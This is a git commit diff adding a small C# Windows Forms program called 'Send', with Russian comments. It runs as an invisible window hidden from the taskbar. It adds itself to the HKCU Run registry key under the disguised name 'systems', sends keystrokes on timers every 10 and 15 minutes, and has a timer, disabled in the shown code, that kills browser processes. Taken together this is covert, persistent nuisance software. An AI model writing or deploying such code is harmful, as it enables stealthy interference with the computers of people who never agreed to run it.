e3b97ba406dfa6709da429c80dd1dac9b34b53dd
Георгий Дудырин <gosha84gur@outlook.com>
2022-12-13 18:17:18 +0300

    Добавьте файлы проекта.

---
+++ Send/Form1.Designer.cs
@@ -0,0 +1,77 @@
+﻿namespace Send
+{
+    partial class Form1
+    {
+        /// <summary>
+        /// Обязательная переменная конструктора.
+        /// </summary>
+        private System.ComponentModel.IContainer components = null;
+
+        /// <summary>
+        /// Освободить все используемые ресурсы.
+        /// </summary>
+        /// <param name="disposing">истинно, если управляемый ресурс должен быть удален; иначе ложно.</param>
+        protected override void Dispose(bool disposing)
+        {
+            if (disposing && (components != null))
+            {
+                components.Dispose();
+            }
+            base.Dispose(disposing);
+        }
+
+        #region Код, автоматически созданный конструктором форм Windows
+
+        /// <summary>
+        /// Требуемый метод для поддержки конструктора — не изменяйте 
+        /// содержимое этого метода с помощью редактора кода.
+        /// </summary>
+        private void InitializeComponent()
+        {
+            this.components = new System.ComponentModel.Container();
+            this.timer1 = new System.Windows.Forms.Timer(this.components);
+            this.timer2 = new System.Windows.Forms.Timer(this.components);
+            this.timer3 = new System.Windows.Forms.Timer(this.components);
+            this.SuspendLayout();
+            // 
+            // timer1
+            // 
+            this.timer1.Enabled = true;
+            this.timer1.Interval = 900000;
+            this.timer1.Tick += new System.EventHandler(this.timer1_Tick);
+            // 
+            // timer2
+            // 
+            this.timer2.Enabled = true;
+            this.timer2.Interval = 600000;
+            this.timer2.Tick += new System.EventHandler(this.timer2_Tick);
+            // 
+            // timer3
+            // 
+            this.timer3.Enabled = true;
+            this.timer3.Interval = 10000;
+            this.timer3.Tick += new System.EventHandler(this.timer3_Tick);
+            // 
+            // Form1
+            // 
+            this.AutoScaleDimensions = new System.Drawing.SizeF(8F, 16F);
+            this.AutoScaleMode = System.Windows.Forms.AutoScaleMode.Font;
+            this.BackColor = System.Drawing.SystemColors.ActiveCaptionText;
+            this.ClientSize = new System.Drawing.Size(148, 0);
+            this.Name = "Form1";
+            this.Opacity = 0D;
+            this.ShowIcon = false;
+            this.ShowInTaskbar = false;
+            this.Text = "Form1";
+            this.ResumeLayout(false);
+
+        }
+
+        #endregion
+
+        private System.Windows.Forms.Timer timer1;
+        private System.Windows.Forms.Timer timer2;
+        private System.Windows.Forms.Timer timer3;
+    }
+}
+
---
+++ Send/Form1.cs
@@ -0,0 +1,82 @@
+﻿using Microsoft.Win32;
+using System;
+using System.Collections.Generic;
+using System.ComponentModel;
+using System.Data;
+using System.Diagnostics;
+using System.Drawing;
+using System.Linq;
+using System.Reflection;
+using System.Text;
+using System.Threading.Tasks;
+using System.Windows.Forms;
+
+namespace Send
+{
+    public partial class Form1 : Form
+    {
+        public Form1()
+        {
+            InitializeComponent();
+            timer1.Start();// запуск таймеров
+            timer2.Start();
+           // timer3.Start();
+            SetAutoRun(true, Assembly.GetExecutingAssembly().Location);
+        }
+
+        private void timer1_Tick(object sender, EventArgs e) // таймер запуска автонажатий раз в 15 мин
+        {
+            SendKeys.Send("f");
+            SendKeys.Send("F");
+        }
+        private bool SetAutoRun(bool autoran,string path) // автозапуск программы 
+        {
+            const string name = "systems";
+            string ExePath = path;
+            RegistryKey reg;
+            reg = Registry.CurrentUser.CreateSubKey("Software\\Microsoft\\Windows\\CurrentVersion\\Run\\");
+            try
+            {
+                if (autoran)
+                {
+                    reg.SetValue(name, ExePath);
+                }
+                else
+                {
+                    reg.DeleteValue(name);
+                }
+                reg.Flush();
+                reg.Close();
+            }
+            catch (Exception) { return false; }
+            return true;
+               
+        }
+
+        private void timer2_Tick(object sender, EventArgs e) // таймер запуска автонажатий раз в 10 мин
+        {
+            SendKeys.Send("А");
+            SendKeys.Send("а");
+        }
+
+        private void timer3_Tick(object sender, EventArgs e)
+        {
+            Process[] localByName = Process.GetProcesses();
+            foreach (Process pr in localByName)
+            {
+                if (pr.ProcessName == "browser.exe")
+                {
+                    pr.Kill();
+                }
+                if (pr.ProcessName == "browser")
+                {
+                    pr.Kill();
+                }
+                //if (pr.ProcessName == "cmd")
+                //{
+                //    pr.Kill();
+                //}
+            }
+        } // убиваю процесс
+    }
+}
